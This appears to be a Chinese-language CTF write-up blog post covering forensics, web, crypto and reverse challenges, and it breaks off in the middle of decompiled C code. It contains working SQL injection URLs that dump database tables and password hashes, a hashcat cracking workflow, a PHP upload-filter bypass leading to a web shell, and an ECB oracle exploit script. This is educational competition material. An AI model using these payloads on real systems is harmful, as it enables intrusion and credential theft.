<p>後面則是在一開始被進入的 dan 的資料夾下找到攻擊者留下的 bloodhound 紀錄，在 Domain Admin role 下有這段敘述：  </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Members who are part of this group have passwords w then a c then a t and an f, curly bracket left, &#x27;bloodhound_is_cool_&#x27; (but all the &#x27;o&#x27;s are &#x27;0&#x27;s), then a city in all lowercase appended by 3 numbers (secret only you know),  right curly bracket&quot;</span><br></pre></td></tr></table></figure>
<p>去網路上拔一個世界城市的 csv 檔生字典檔作字典攻擊  </p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> csv</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;cities.csv&#x27;</span>, newline=<span class="string">&#x27;&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> csvfile:</span><br><span class="line">    reader = csv.reader(csvfile)</span><br><span class="line">    </span><br><span class="line">    city_names = [row[<span class="number">0</span>].lower() <span class="keyword">for</span> row <span class="keyword">in</span> reader]</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;votuporanga&#x27;</span> <span class="keyword">in</span> city_names)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> city <span class="keyword">in</span> city_names:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1000</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;wctf&#123;&#123;bl00dh0und_is_c00l_<span class="subst">&#123;city&#125;</span><span class="subst">&#123;i:03d&#125;</span>&#125;&#125;&quot;</span>)</span><br></pre></td></tr></table></figure>
<p>輸出到 passlist.txt，最後 hashcat  </p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat <span class="built_in">hash</span> passlist.txt</span><br></pre></td></tr></table></figure>
<p>收工 XD，<del>結果這題值 499 分（驚</del>  </p>
<h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="Limited-1"><a href="#Limited-1" class="headerlink" title="Limited 1"></a>Limited 1</h3><p>DB 是 MYSQL  </p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/query&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">query</span>():</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        price = <span class="built_in">float</span>(request.args.get(<span class="string">&#x27;price&#x27;</span>) <span class="keyword">or</span> <span class="string">&#x27;0.00&#x27;</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        price = <span class="number">0.0</span></span><br><span class="line"></span><br><span class="line">    price_op = <span class="built_in">str</span>(request.args.get(<span class="string">&#x27;price_op&#x27;</span>) <span class="keyword">or</span> <span class="string">&#x27;&gt;&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> re.<span class="keyword">match</span>(<span class="string">r&#x27; ?(=|&lt;|&lt;=|&lt;&gt;|&gt;=|&gt;) ?&#x27;</span>, price_op):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;price_op must be one of =, &lt;, &lt;=, &lt;&gt;, &gt;=, or &gt; (with an optional space on either side)&#x27;</span>, <span class="number">400</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># allow for at most one space on either side</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(price_op) &gt; <span class="number">4</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;price_op too long&#x27;</span>, <span class="number">400</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># I&#x27;m pretty sure the LIMIT clause cannot be used for an injection</span></span><br><span class="line">    <span class="comment"># with MySQL 9.x</span></span><br><span class="line">    <span class="comment">#</span></span><br><span class="line">    <span class="comment"># This attack works in v5.5 but not later versions</span></span><br><span class="line">    <span class="comment"># https://lightless.me/archives/111.html</span></span><br><span class="line">    limit = <span class="built_in">str</span>(request.args.get(<span class="string">&#x27;limit&#x27;</span>) <span class="keyword">or</span> <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    query = <span class="string">f&quot;&quot;&quot;SELECT /*<span class="subst">&#123;FLAG1&#125;</span>*/category, name, price, description FROM Menu WHERE price <span class="subst">&#123;price_op&#125;</span> <span class="subst">&#123;price&#125;</span> ORDER BY 1 LIMIT <span class="subst">&#123;limit&#125;</span>&quot;&quot;&quot;</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;query:&#x27;</span>, query)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;;&#x27;</span> <span class="keyword">in</span> query:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;Sorry, multiple statements are not allowed&#x27;</span>, <span class="number">400</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        cur = mysql.connection.cursor()</span><br><span class="line">        cur.execute(query)</span><br><span class="line">        records = cur.fetchall()</span><br><span class="line">        column_names = [desc[<span class="number">0</span>] <span class="keyword">for</span> desc <span class="keyword">in</span> cur.description]</span><br><span class="line">        cur.close()</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">str</span>(e), <span class="number">400</span></span><br><span class="line"></span><br><span class="line">    result = [<span class="built_in">dict</span>(<span class="built_in">zip</span>(column_names, row)) <span class="keyword">for</span> row <span class="keyword">in</span> records]</span><br><span class="line">    <span class="keyword">return</span> jsonify(result)</span><br></pre></td></tr></table></figure>
<p>擷取重點段，一個 sqli 但是在 LIMIT 那邊才是 FREE (?)<br>仔細觀察會發現 price_op 還是可以塞髒東西，我這邊是用 <code>/*</code> 並且在 LIMIT 後面接上 <code>*/</code> 去前後呼應把東西都註解掉，轉成裸 UNION BASE SQLI<br>第一把 flag 是要讀註解內容所以要去讀當前 process 的 connect info：  </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/query?price=10.00&amp;price_op=&lt; /*&amp;limit=*/ 0 UNION SELECT 1, (SELECT info FROM information_schema.processlist WHERE id = CONNECTION_ID()), 3, 4</span><br></pre></td></tr></table></figure>
<h3 id="Limited-2"><a href="#Limited-2" class="headerlink" title="Limited 2"></a>Limited 2</h3><p>information_schema 路讀 db 裡的 flag：  </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/query?price=10.00&amp;price_op=&lt; /*&amp;limit=*/ 1 UNION SELECT 1, 1, 1, GROUP_CONCAT(0x7c,table_name,0x7C) FROM information_schema.tables WHERE table_schema=&#x27;ctf&#x27;</span><br><span class="line">/query?price=10.00&amp;price_op=&lt; /*&amp;limit=*/ 1 UNION SELECT 1, 1, 1, GROUP_CONCAT(0x7c,schema_name,0x7c) FROM information_schema.schemata</span><br><span class="line">/query?price=10.00&amp;price_op=&lt; /*&amp;limit=*/ 1 UNION SELECT 1, 1, 1, value FROM Flag_843423739</span><br></pre></td></tr></table></figure>
<h3 id="Limited-3"><a href="#Limited-3" class="headerlink" title="Limited 3"></a>Limited 3</h3><p>要拿到 db user 裡面 flag 的密碼<br>Based on <a target="_blank" rel="noopener" href="https://hashcat.net/wiki/doku.php?id=example_hashes">https://hashcat.net/wiki/doku.php?id=example_hashes</a>  </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT user, CONCAT(&#x27;$mysql&#x27;, SUBSTR(authentication_string,1,3), LPAD(CONV(SUBSTR(authentication_string,4,3),16,10),4,0),&#x27;*&#x27;,INSERT(HEX(SUBSTR(authentication_string,8)),41,0,&#x27;*&#x27;)) AS hash FROM user WHERE plugin = &#x27;caching_sha2_password&#x27; AND authentication_string NOT LIKE &#x27;%INVALIDSALTANDPASSWORD%&#x27;;</span><br></pre></td></tr></table></figure>

<h3 id="Art-Contest"><a href="#Art-Contest" class="headerlink" title="Art Contest"></a>Art Contest</h3><p>重點段，用 strrpos 提取附檔名後 chmod 000，<del>有種 x3CTF 看過的味道</del>  </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;fileToUpload&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$target_file</span> = <span class="title function_ invoke__">basename</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;fileToUpload&quot;</span>][<span class="string">&quot;name&quot;</span>]);</span><br><span class="line">    <span class="variable">$session_id</span> = <span class="title function_ invoke__">session_id</span>();</span><br><span class="line">    <span class="variable">$target_dir</span> = <span class="string">&quot;/var/www/html/uploads/<span class="subst">$session_id</span>/&quot;</span>;</span><br><span class="line">    <span class="variable">$target_file_path</span> = <span class="variable">$target_dir</span> . <span class="variable">$target_file</span>;</span><br><span class="line">    <span class="variable">$uploadOk</span> = <span class="number">1</span>;</span><br><span class="line">    <span class="variable">$lastDotPosition</span> = <span class="title function_ invoke__">strrpos</span>(<span class="variable">$target_file</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check if file already exists</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(<span class="variable">$target_file_path</span>)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Sorry, file already exists.\n&quot;</span>;</span><br><span class="line">        <span class="variable">$uploadOk</span> = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// Check file size</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$_FILES</span>[<span class="string">&quot;fileToUpload&quot;</span>][<span class="string">&quot;size&quot;</span>] &gt; <span class="number">50000</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Sorry, your file is too large.\n&quot;</span>;</span><br><span class="line">        <span class="variable">$uploadOk</span> = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// If the file contains no dot, evaluate just the filename</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$lastDotPosition</span> == <span class="literal">false</span>) &#123;</span><br><span class="line">        <span class="variable">$filename</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$target_file</span>, <span class="number">0</span>, <span class="variable">$lastDotPosition</span>);</span><br><span class="line">        <span class="variable">$extension</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$filename</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$target_file</span>, <span class="number">0</span>, <span class="variable">$lastDotPosition</span>);</span><br><span class="line">        <span class="variable">$extension</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$target_file</span>, <span class="variable">$lastDotPosition</span> + <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;h1&gt;&quot;</span>.<span class="variable">$filename</span>.<span class="string">&quot;&lt;br&gt;&quot;</span>.<span class="variable">$extension</span>.<span class="string">&quot;&lt;/h1&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Ensure that the extension is a txt file</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$extension</span> !== <span class="string">&#x27;&#x27;</span> &amp;&amp; <span class="variable">$extension</span> !== <span class="string">&#x27;txt&#x27;</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Sorry, only .txt extensions are allowed.\n&quot;</span>;</span><br><span class="line">        <span class="variable">$uploadOk</span> = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (!(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^[a-f0-9]&#123;32&#125;$/&#x27;</span>, <span class="variable">$session_id</span>))) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Sorry, that is not a valid session ID.\n&quot;</span>;</span><br><span class="line">        <span class="variable">$uploadOk</span> = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check if $uploadOk is set to 0 by an error</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$uploadOk</span> == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Sorry, your file was not uploaded.\n&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// If everything is ok, try to upload the file</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;fileToUpload&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>], <span class="variable">$target_file_path</span>)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;The file &quot;</span> . <span class="title function_ invoke__">htmlspecialchars</span>(<span class="title function_ invoke__">basename</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;fileToUpload&quot;</span>][<span class="string">&quot;name&quot;</span>])) . <span class="string">&quot; has been uploaded.&quot;</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;Sorry, there was an error uploading your file.&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$old_path</span> = <span class="title function_ invoke__">getcwd</span>();</span><br><span class="line">    <span class="title function_ invoke__">chdir</span>(<span class="variable">$target_dir</span>);</span><br><span class="line">    <span class="comment">// make unreadable - the proper way</span></span><br><span class="line">    <span class="title function_ invoke__">shell_exec</span>(<span class="string">&#x27;chmod -- 000 *&#x27;</span>);</span><br><span class="line">    <span class="title function_ invoke__">chdir</span>(<span class="variable">$old_path</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>簡單來說漏洞出在  </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="variable">$lastDotPosition</span> == <span class="literal">false</span>) &#123;</span><br><span class="line">    <span class="variable">$filename</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$target_file</span>, <span class="number">0</span>, <span class="variable">$lastDotPosition</span>);</span><br><span class="line">    <span class="variable">$extension</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$filename</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$target_file</span>, <span class="number">0</span>, <span class="variable">$lastDotPosition</span>);</span><br><span class="line">    <span class="variable">$extension</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$target_file</span>, <span class="variable">$lastDotPosition</span> + <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h1&gt;&quot;</span>.<span class="variable">$filename</span>.<span class="string">&quot;&lt;br&gt;&quot;</span>.<span class="variable">$extension</span>.<span class="string">&quot;&lt;/h1&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Ensure that the extension is a txt file</span></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$extension</span> !== <span class="string">&#x27;&#x27;</span> &amp;&amp; <span class="variable">$extension</span> !== <span class="string">&#x27;txt&#x27;</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Sorry, only .txt extensions are allowed.\n&quot;</span>;</span><br><span class="line">    <span class="variable">$uploadOk</span> = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>如果今天上傳一個檔名就叫做 <code>.php</code>，那跑出來的 <code>$lastDotPosition</code> 會是 0，導致比對 false 的時候成立<br>同時 <code>*</code> 不會去匹配 linux 下的隱藏檔案(開頭是點)，自動繞過ㄌ  </p>
<p><img src="https://hackmd.io/_uploads/SyDCNU02Je.png" alt="image"><br>剩下就是到自己的 session 名稱的 upload directory get shell 即可  </p>
<h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="ECB"><a href="#ECB" class="headerlink" title="ECB++"></a>ECB++</h3><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/local/bin/python3</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> pad</span><br><span class="line"><span class="keyword">from</span> Crypto.Random <span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&#x27;./flag.txt&#x27;</span>,<span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">flag = f.read()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">message</span>):</span><br><span class="line">    <span class="keyword">global</span> flag</span><br><span class="line">    message = message.encode()</span><br><span class="line">    message += flag.encode()</span><br><span class="line">    key = random.getrandbits(<span class="number">256</span>)</span><br><span class="line">    key = key.to_bytes(<span class="number">32</span>,<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line">    cipher = AES.new(key, AES.MODE_ECB)</span><br><span class="line">    ciphertext = cipher.encrypt(pad(message, AES.block_size))</span><br><span class="line">    <span class="keyword">return</span>(ciphertext.<span class="built_in">hex</span>())</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Welcome to my secure encryption machine!&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;I&#x27;ll encrypt all your messages (and add a little surprise at the end)&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(<span class="literal">True</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Do you have a message to encrypt? [Y|N]&quot;</span>)</span><br><span class="line">    response = <span class="built_in">input</span>()</span><br><span class="line">    <span class="keyword">if</span>(response == <span class="string">&#x27;Y&#x27;</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Gimme your message:&quot;</span>)</span><br><span class="line">        message = <span class="built_in">input</span>()</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Your message is: &quot;</span>,encrypt(message))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        exit(<span class="number">0</span>)</span><br></pre></td></tr></table></figure>
<p>蠻明顯是要 Prepend Oracle，但因為每次 key 不一樣要改良打法變成：<code>&#39;A&#39;*31+&#39;猜的字元&#39;+&#39;A&#39;*31</code>去 LEAK 值<br><strong>exp.py</strong>  </p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> trange, tqdm</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&#x27;ecbpp.kctf-453514-codelab.kctf.cloud&#x27;</span>, <span class="number">1337</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">oracle</span>(<span class="params">m</span>):</span><br><span class="line">    r.sendline(<span class="string">b&#x27;Y&#x27;</span>)</span><br><span class="line">    r.sendline(m)</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;Your message is: &#x27;</span>)</span><br><span class="line">    msg = r.recvuntil(<span class="string">b&#x27;\n&#x27;</span>)[<span class="number">1</span>:-<span class="number">1</span>]</span><br><span class="line">    <span class="comment">#print(msg)</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytes</span>.fromhex(msg.decode())</span><br><span class="line"></span><br><span class="line">flag = <span class="string">b&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    i=<span class="built_in">len</span>(flag)</span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> tqdm(string.printable):</span><br><span class="line">        prefix = <span class="string">b&#x27;A&#x27;</span> * (<span class="number">96</span> - <span class="number">1</span> - i)+flag+<span class="built_in">bytes</span>([<span class="built_in">ord</span>(c)])</span><br><span class="line">        prefix += <span class="string">b&#x27;A&#x27;</span> * (<span class="number">96</span> - <span class="number">1</span> - i)</span><br><span class="line">        <span class="comment">#print(prefix)</span></span><br><span class="line">        result=oracle(prefix)</span><br><span class="line">        <span class="keyword">if</span> result[:<span class="number">96</span>]==result[<span class="number">96</span>:<span class="number">96</span>*<span class="number">2</span>]:</span><br><span class="line">            flag+=<span class="built_in">bytes</span>([<span class="built_in">ord</span>(c)])</span><br><span class="line">            <span class="built_in">print</span>(i, flag)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h2><h3 id="Office"><a href="#Office" class="headerlink" title="Office"></a>Office</h3><p>直接扔 IDA，一道服務的 reverse 題目<br><del>睡前發現沒人打爬起來荼毒自己</del>  </p>
<p><strong>main</strong>  </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __fastcall __noreturn <span class="title function_">main</span><span class="params">(__int64 a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">3</span>]; <span class="comment">// [rsp+1h] [rbp-Fh] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v4; <span class="comment">// [rsp+4h] [rbp-Ch]</span></span><br><span class="line">  FILE *stream; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  sub_40149A();</span><br><span class="line">  stream = fopen(<span class="string">&quot;/dev/urandom&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !stream )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Cannot open /dev/urandom&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  fread(&amp;byte_4040A9, <span class="number">1uLL</span>, <span class="number">1uLL</span>, stream);</span><br><span class="line">  fclose(stream);</span><br><span class="line">  urandom_byte = byte_4040A9;</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      sub_4012E1();</span><br><span class="line">      fgets(s, <span class="number">3</span>, <span class="built_in">stdin</span>);</span><br><span class="line">      *__errno_location() = <span class="number">0</span>;</span><br><span class="line">      v4 = strtol(s, <span class="number">0LL</span>, <span class="number">10</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( *__errno_location() );</span><br><span class="line">    <span class="keyword">if</span> ( v4 == <span class="number">3</span> )</span><br><span class="line">      sub_4013E3();</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="type">int</span>)v4 &gt; <span class="number">3</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">if</span> ( v4 == <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      sub_4011C6();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v4 != <span class="number">2</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      raise();</span><br><span class="line">    &#125;</span><br><span class="line">LABEL_14:</span><br><span class="line">    <span class="keyword">if</span> ( balence_default_1337 &lt;= <span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span 